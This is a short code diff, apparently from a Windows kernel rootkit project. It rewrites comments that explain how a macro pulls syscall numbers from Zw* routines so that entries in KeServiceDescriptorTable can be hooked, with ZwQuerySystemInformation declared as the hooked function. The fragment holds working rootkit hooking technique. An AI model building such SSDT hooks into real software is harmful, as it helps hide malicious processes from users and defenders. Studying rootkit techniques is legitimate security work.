@@ -20,12 +20,14 @@ extern PSST KeServiceDescriptorTable;
  * Clever trick from "The Rootkit Arsenal".
  * This macro identifies the number of the system call we're trying to hook.
  * All of the Zw* () routines start with: mov eax, xxxh, where "xxx" is a syscall number.
- * So, the number is actually stored in the second byte of the ADDRESS of system call.
- * So, by adding 1 to the system call address, we can access the system call number.
+ * We're operating on byte-code.
+ * The number is actually stored under the ADDRESS of system call offset by 1 byte
+ * (mov instruction stores a number in its 2nd byte).
+ * That's why we can access the system call number by adding 1 to the system call address,.
  */
 #define GetServiceNumber(Function)(*(PULONG)((PUCHAR)Function + 1));
 
- // Define the original prototype of the hooked function
+// Define the original prototype of the hooked function
 NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
 
 typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
